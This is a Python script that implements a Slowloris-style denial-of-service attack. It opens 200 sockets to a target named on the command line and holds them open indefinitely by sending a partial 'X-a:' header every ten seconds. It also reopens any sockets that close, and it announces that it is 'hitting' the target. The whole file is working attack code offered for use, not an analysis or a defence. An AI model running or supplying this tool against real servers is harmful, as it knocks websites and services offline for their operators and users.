from reporter import *
from socks import *

from datetime import datetime
from time import sleep
from sys import argv

def init_socks():
	global socks

	c=Counter()
	report=Reporter(c,num_socks,Reporter.CREATE)
	report.start()
	for n in range(num_socks):
		try:
			sock=create_sock(addr,port,path)
		except error:
			print('\nfailed to create socket #{}, exiting'.format(n+1))
			exit()
		if sock:
			socks.append(sock)
			c.put(n)
	report.join()

	return socks

def keep_alive():
	global socks

	print("[{}] Sending keep-alive headers for {} sockets".format(str(datetime.now()).split('.')[0],len(socks)))
	for sock in socks:
		try: sock.send(bytes("X-a: {}\r\n".format(message),'UTF-8'))
		except error:
			i=socks.index(sock)
			print("socket #{} failed, removing from list".format(i))
			socks.pop(i)

def resurrect():
	global socks
	
	if num_socks-len(socks)>0:
		lsocks=num_socks-len(socks)

		c=Counter()
		report=Reporter(q,lsocks,Reporter.REGEN)
		report.start()
		for n in range(lsocks):
			try: sock=create_sock(addr,port,path)
			except error: pass

			if sock:
				socks.append(sock)
				c.put(n)
		report.join()

if __name__=='__main__':
	num_socks,timeout,message=200,10,'deadbeef'
	addr,port,path=resolve_settings(argv)

	print('hitting %s%s on port %s with %d sockets\n'%(addr,path,port,num_socks))

	socks=[]
	init_socks()

	while True:
		sleep(timeout)
		keep_alive()
		resurrect()